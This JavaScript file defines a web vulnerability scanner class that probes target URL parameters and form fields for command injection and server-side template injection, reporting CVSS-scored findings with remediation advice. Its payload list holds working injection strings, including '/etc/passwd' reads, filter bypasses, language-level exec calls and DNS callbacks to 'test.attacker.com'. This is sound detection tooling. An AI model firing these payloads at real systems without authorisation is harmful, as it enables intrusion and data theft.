import { BaseScanner } from './BaseScanner.js';

export class RCEScanner extends BaseScanner {
  constructor(config) {
    super(config);
    this.name = 'RCE Scanner';
    
    // Command injection payloads
    this.payloads = [
      // Basic command injection
      '; id',
      '| id',
      '|| id',
      '& id',
      '&& id',
      '`id`',
      '$(id)',
      
      // Newline injection
      '\n id',
      '\r\n id',
      '%0a id',
      '%0d%0a id',
      
      // Time-based payloads
      '; sleep 5',
      '| sleep 5',
      '|| sleep 5',
      '& sleep 5 &',
      '&& sleep 5',
      '`sleep 5`',
      '$(sleep 5)',
      
      // Windows payloads
      '| ping -n 5 127.0.0.1',
      '& ping -n 5 127.0.0.1',
      '|| ping -n 5 127.0.0.1',
      '&& ping -n 5 127.0.0.1',
      '| timeout 5',
      
      // Blind detection with DNS
      '| nslookup test.attacker.com',
      '& nslookup test.attacker.com',
      '$(nslookup test.attacker.com)',
      
      // Common vulnerable functions
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '; type c:\\windows\\system32\\drivers\\etc\\hosts',
      '| type c:\\windows\\system32\\drivers\\etc\\hosts',
      
      // Filter bypass
      ';${IFS}id',
      ';$IFS\'id\'',
      '{id}',
      '|${IFS}id',
      
      // Python code injection
      '__import__("os").system("id")',
      'eval("__import__(\'os\').system(\'id\')")',
      
      // Node.js/JavaScript injection
      'require("child_process").exec("id")',
      'process.mainModule.require("child_process").exec("id")',
      
      // Ruby injection
      '`id`',
      'system("id")',
      '%x(id)',
      
      // Perl injection
      '|id|',
      'print `id`'
    ];
    
    // Parameters commonly used for command execution
    this.cmdParameters = [
      'cmd', 'exec', 'command', 'execute', 'run',
      'ping', 'host', 'ip', 'process', 'do',
      'action', 'shell', 'payload', 'cli', 'daemon',
      'arg', 'args', 'arguments', 'options', 'opt'
    ];

    /**
     * SSTI Template Syntax Definitions
     * Each entry defines the template syntax wrapper and how to build the
     * mathematical expression that will be evaluated server-side.
     * We use these with dynamically generated random integers to ensure
     * the expected result is globally unique and cannot appear by coincidence.
     */
    this.sstiTemplates = [
      // Jinja2 / Twig / Django — {{expr}}
      { wrap: (expr) => '{{' + expr + '}}',           rawWrap: (expr) => '{{' + expr + '}}',           engine: 'Jinja2/Twig/Django' },
      // Mako / EL (Expression Language) — ${expr}
      // Cannot use template literals here because ${} conflicts with JS interpolation
      { wrap: (expr) => '${' + expr + '}',             rawWrap: (expr) => '${' + expr + '}',             engine: 'Mako/EL' },
      // ERB (Ruby) — <%= expr %>
      { wrap: (expr) => '<%= ' + expr + ' %>',         rawWrap: (expr) => '<%= ' + expr + ' %>',         engine: 'ERB (Ruby)' },
      // Pebble / Freemarker nested — ${{expr}}
      // Cannot use template literals here because ${{ conflicts with JS interpolation
      { wrap: (expr) => '${{' + expr + '}}',           rawWrap: (expr) => '${{' + expr + '}}',           engine: 'Pebble/Freemarker' },
      // Smarty / Generic — {expr}
      { wrap: (expr) => '{' + expr + '}',              rawWrap: (expr) => '{' + expr + '}',              engine: 'Smarty' },
      // Spring EL — #{expr}
      { wrap: (expr) => '#{' + expr + '}',             rawWrap: (expr) => '#{' + expr + '}',             engine: 'Spring EL' },
      // Thymeleaf — [[expr]]
      { wrap: (expr) => '[[' + expr + ']]',            rawWrap: (expr) => '[[' + expr + ']]',            engine: 'Thymeleaf' },
    ];
  }
  
  /**
   * Generate two random large integers (5-digit range) and compute their product.
   * The product is extremely unlikely to appear naturally in any response body,
   * which eliminates the classic "49" false-positive from {{7*7}}.
   * @returns {{ rand1: number, rand2: number, expected: number, expr: string }}
   */
  generateDynamicMathPayload() {
    // Use 5-digit random integers to guarantee a globally unique result
    const rand1 = Math.floor(Math.random() * 90000) + 10000; // 10000-99999
    const rand2 = Math.floor(Math.random() * 90000) + 10000; // 10000-99999
    const expected = rand1 * rand2;
    const expr = `${rand1}*${rand2}`;
    return { rand1, rand2, expected, expr };
  }

  async scan(data) {
    const vulnerabilities = [];
    const { urls, forms, parameters } = data;
    
    // Identify potentially dangerous parameters
    const potentialParams = parameters.filter(p => 
      this.cmdParameters.some(cp => p.toLowerCase().includes(cp))
    );
    
    // Test URL parameters
    for (const url of urls) {
      if (this.stopped) break;
      
      try {
        const parsedUrl = new URL(url);
        
        for (const [key, value] of parsedUrl.searchParams.entries()) {
          if (potentialParams.includes(key)) {
            const vulns = await this.testParameter(url, key, value);
            vulnerabilities.push(...vulns);
          }
        }
      } catch (error) {
        this.log(`RCE URL parse error: ${error.message}`, 'debug');
      }
    }
    
    // Test forms
    for (const form of forms) {
      if (this.stopped) break;
      
      for (const input of form.inputs) {
        if (!input.name) continue;
        
        if (this.cmdParameters.some(cp => input.name.toLowerCase().includes(cp))) {
          const vulns = await this.testFormInput(form, input);
          vulnerabilities.push(...vulns);
        }
      }
    }
    
    // Also test for SSTI on all parameters (now with dynamic payloads + double validation)
    const sstiVulns = await this.testSSTI(urls);
    vulnerabilities.push(...sstiVulns);
    
    return vulnerabilities;
  }
  
  async testParameter(baseUrl, paramName, originalValue) {
    const vulnerabilities = [];
    
    // Test command injection
    const cmdPayloads = this.getTestPayloads('cmd');
    
    for (const payload of cmdPayloads) {
      if (this.stopped) break;
      
      try {
        const testUrl = new URL(baseUrl);
        testUrl.searchParams.set(paramName, originalValue + payload);
        
        const startTime = Date.now();
        const response = await this.makeRequest(testUrl.href, { timeout: 15000 });
        const duration = Date.now() - startTime;
        
        if (!response) continue;
        
        const rceIndicators = this.detectRCE(response.data, payload, duration);
        
        if (rceIndicators.detected) {
          /**
           * TIME-BASED DOUBLE VALIDATION:
           * For time-based detections, we send the same payload a second time
           * to confirm the delay is consistent and not caused by network jitter.
           * A single slow response is not sufficient evidence.
           */
          if (rceIndicators.type === 'Time-based Command Injection') {
            this.log(`Time-based RCE candidate on "${paramName}", running confirmation request...`, 'info');
            const confirmStart = Date.now();
            await this.makeRequest(testUrl.href, { timeout: 15000 });
            const confirmDuration = Date.now() - confirmStart;

            // Both requests must exceed the sleep threshold (5s) to confirm
            if (confirmDuration < 4500) {
              this.log(`Time-based RCE confirmation FAILED for "${paramName}" (confirm: ${confirmDuration}ms). Discarding as FP.`, 'info');
              continue; // Discard — likely network latency, not command injection
            }
            rceIndicators.evidence += ` | Confirmed with second request: ${confirmDuration}ms`;
          }

          vulnerabilities.push({
            type: 'RCE',
            subType: rceIndicators.type,
            severity: 'critical',
            url: baseUrl,
            parameter: paramName,
            payload: payload,
            evidence: rceIndicators.evidence,
            description: `Remote Code Execution vulnerability in parameter "${paramName}". ${rceIndicators.description}`,
            remediation: 'Never pass user input to system commands. Use allowlists for allowed operations. Implement strict input validation. Use safe APIs instead of shell commands.',
            references: [
              'https://portswigger.net/web-security/os-command-injection',
              'https://owasp.org/www-community/attacks/Command_Injection'
            ],
            cvss: 10.0,
            cwe: 'CWE-78'
          });
          
          break;
        }
      } catch (error) {
        this.log(`RCE test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  async testFormInput(form, input) {
    const vulnerabilities = [];
    const cmdPayloads = this.getTestPayloads('cmd');
    
    for (const payload of cmdPayloads) {
      if (this.stopped) break;
      
      const formData = {};
      form.inputs.forEach(inp => {
        formData[inp.name] = inp.name === input.name ? payload : inp.value || 'test';
      });
      
      try {
        const startTime = Date.now();
        const response = await this.makeRequest(form.action, {
          method: form.method,
          data: form.method === 'POST' ? formData : undefined,
          params: form.method === 'GET' ? formData : undefined,
          timeout: 15000
        });
        const duration = Date.now() - startTime;
        
        if (!response) continue;
        
        const rceIndicators = this.detectRCE(response.data, payload, duration);
        
        if (rceIndicators.detected) {
          /**
           * TIME-BASED DOUBLE VALIDATION for form inputs:
           * Same principle — confirm time-based findings with a second request
           * to rule out false positives from slow servers or network issues.
           */
          if (rceIndicators.type === 'Time-based Command Injection') {
            this.log(`Time-based RCE candidate on form field "${input.name}", running confirmation...`, 'info');
            const confirmStart = Date.now();
            await this.makeRequest(form.action, {
              method: form.method,
              data: form.method === 'POST' ? formData : undefined,
              params: form.method === 'GET' ? formData : undefined,
              timeout: 15000
            });
            const confirmDuration = Date.now() - confirmStart;

            if (confirmDuration < 4500) {
              this.log(`Time-based RCE confirmation FAILED for form field "${input.name}" (confirm: ${confirmDuration}ms). Discarding as FP.`, 'info');
              continue;
            }
            rceIndicators.evidence += ` | Confirmed: ${confirmDuration}ms`;
          }

          vulnerabilities.push({
            type: 'RCE',
            subType: rceIndicators.type,
            severity: 'critical',
            url: form.action,
            method: form.method,
            parameter: input.name,
            payload: payload,
            evidence: rceIndicators.evidence,
            description: `RCE vulnerability in form field "${input.name}"`,
            remediation: 'Never execute user-controlled commands.',
            references: [
              'https://portswigger.net/web-security/os-command-injection'
            ],
            cvss: 10.0,
            cwe: 'CWE-78'
          });
          break;
        }
      } catch (error) {
        this.log(`RCE form test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  /**
   * REFACTORED: testSSTI now uses Dynamic Payload Generation + Double Validation.
   *
   * OLD LOGIC (vulnerable to false positives):
   *   - Sent static {{7*7}} and checked if "49" appeared anywhere in the response.
   *   - "49" is extremely common in normal HTML (pagination, IDs, dates, etc.).
   *
   * NEW LOGIC:
   *   1. Generate two random large integers (e.g., 83721 and 47293).
   *   2. Compute the expected product (e.g., 83721 * 47293 = 3959554053).
   *   3. Send the payload (e.g., {{83721*47293}}) to each parameter.
   *   4. DOUBLE VALIDATION:
   *      a) CHECK 1: The computed result (3959554053) MUST exist in the response body.
   *         → This proves the server evaluated the math expression.
   *      b) CHECK 2: The raw template syntax ({{83721*47293}}) must NOT exist in the body.
   *         → If the raw syntax is present, it was reflected but NOT processed by a
   *           template engine. This is reflection, not SSTI.
   *   5. Only if BOTH checks pass is the finding reported as a true positive.
   */
  async testSSTI(urls) {
    const vulnerabilities = [];
    
    for (const url of urls) {
      if (this.stopped) break;
      
      try {
        const parsedUrl = new URL(url);
        
        for (const [key, value] of parsedUrl.searchParams.entries()) {
          if (this.stopped) break;

          // Test each template engine syntax with a unique dynamic payload
          for (const template of this.sstiTemplates) {
            if (this.stopped) break;

            try {
              // ── Step 1: Generate globally unique math payload ──
              const { rand1, rand2, expected, expr } = this.generateDynamicMathPayload();
              
              // Build the full payload: e.g., {{83721*47293}}
              const sstiPayload = template.wrap(expr);
              // Build the raw syntax string for reflection check: e.g., {{83721*47293}}
              const rawSyntax = template.rawWrap(expr);
              const expectedStr = expected.toString();

              this.log(`SSTI testing param "${key}" with ${template.engine}: ${sstiPayload}`, 'debug');

              const testUrl = new URL(url);
              testUrl.searchParams.set(key, sstiPayload);
              
              const response = await this.makeRequest(testUrl.href);
              if (!response) continue;
              
              const bodyStr = response.data ? response.data.toString() : '';

              // ── Step 2: Double Validation ──

              // CHECK 1: Does the evaluated result appear in the response?
              const resultFound = bodyStr.includes(expectedStr);

              // CHECK 2: Is the raw template syntax ABSENT from the response?
              // If present, the server simply reflected our input without evaluating it.
              const rawSyntaxAbsent = !bodyStr.includes(rawSyntax);

              if (resultFound && rawSyntaxAbsent) {
                /**
                 * CONFIRMED SSTI:
                 * - The unique math result is in the response (server computed it).
                 * - The raw template syntax is gone (template engine consumed it).
                 * This is a TRUE POSITIVE with extremely high confidence.
                 */
                this.log(`[CONFIRMED] SSTI detected on param "${key}" via ${template.engine}! Payload: ${sstiPayload} → Result: ${expectedStr}`, 'info');

                vulnerabilities.push({
                  type: 'SSTI',
                  subType: 'Server-Side Template Injection',
                  severity: 'critical',
                  url: url,
                  parameter: key,
                  payload: sstiPayload,
                  evidence: `Template expression ${sstiPayload} evaluated to ${expectedStr} (engine: ${template.engine}). Raw syntax was consumed by the template engine.`,
                  description: `Server-Side Template Injection in parameter "${key}" using ${template.engine} syntax. The template engine evaluated ${expr} = ${expectedStr}. This can lead to Remote Code Execution (RCE).`,
                  remediation: 'Use logic-less templates when possible. Sanitize user input before template processing. Use sandboxed template environments. Never pass raw user input into template rendering functions.',
                  references: [
                    'https://portswigger.net/web-security/server-side-template-injection',
                    'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection'
                  ],
                  cvss: 9.8,
                  cwe: 'CWE-94'
                });

                // One confirmed SSTI per parameter is sufficient; skip remaining engines
                break;
              } else if (resultFound && !rawSyntaxAbsent) {
                /**
                 * FALSE POSITIVE — Reflected but NOT evaluated:
                 * The expected result appears, but so does the raw template syntax.
                 * This means the server just echoed our input back. The math result
                 * appearing is coincidental (or the expression string contains the
                 * result by chance). Discard this finding.
                 */
                this.log(`SSTI FP discard: param "${key}" reflected raw syntax for ${template.engine}. Not a real SSTI.`, 'debug');
              }
              // If resultFound is false, the template was not evaluated — move on.

            } catch (templateError) {
              this.log(`SSTI template test error (${template.engine}): ${templateError.message}`, 'debug');
            }
          }
        }
      } catch (error) {
        this.log(`SSTI test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  detectRCE(body, payload, duration) {
    const result = {
      detected: false,
      type: '',
      evidence: '',
      description: ''
    };
    
    if (!body) return result;
    const bodyStr = body.toString();
    
    // Command output indicators
    const cmdOutputPatterns = [
      { pattern: /uid=\d+\([a-z]+\)\s+gid=\d+/i, type: 'Command Output (id)', desc: 'id command output detected' },
      { pattern: /root:.*:0:0:/i, type: 'File Content (/etc/passwd)', desc: 'passwd file content leaked' },
      { pattern: /Linux\s+\S+\s+\d+\.\d+/i, type: 'System Info (uname)', desc: 'System information leaked' },
      { pattern: /Reply from 127\.0\.0\.1/i, type: 'Command Output (ping)', desc: 'ping command output detected' },
      { pattern: /TTL=\d+/i, type: 'Command Output (ping)', desc: 'Windows ping output detected' }
    ];
    
    for (const p of cmdOutputPatterns) {
      if (p.pattern.test(bodyStr)) {
        result.detected = true;
        result.type = p.type;
        result.evidence = bodyStr.match(p.pattern)[0];
        result.description = p.desc;
        return result;
      }
    }
    
    /**
     * TIME-BASED DETECTION:
     * We flag as a candidate here; the calling function (testParameter / testFormInput)
     * will perform the double-validation confirmation request. The threshold is 5000ms
     * because our sleep payloads use "sleep 5".
     */
    if (payload.includes('sleep') && duration >= 5000) {
      result.detected = true;
      result.type = 'Time-based Command Injection';
      result.evidence = `Response delayed by ${duration}ms after sleep command`;
      result.description = 'Time-based command injection candidate (awaiting confirmation)';
      return result;
    }
    
    // Error-based detection
    const errorPatterns = [
      /sh: \d+: [a-z]+: not found/i,
      /command not found/i,
      /is not recognized as an internal or external command/i,
      /Cannot run program/i
    ];
    
    for (const pattern of errorPatterns) {
      if (pattern.test(bodyStr)) {
        result.detected = true;
        result.type = 'Error-based Command Injection';
        result.evidence = bodyStr.match(pattern)[0];
        result.description = 'Error message indicates command execution attempt';
        return result;
      }
    }
    
    return result;
  }
  
  getTestPayloads(type) {
    if (type === 'cmd') {
      return [
        '| id',
        '; id',
        '`id`',
        '$(id)',
        '| sleep 5',
        '; sleep 5',
        '& ping -c 5 127.0.0.1 &'
      ];
    }
    // No longer returning static code injection payloads — SSTI is handled by testSSTI
    return [];
  }
}
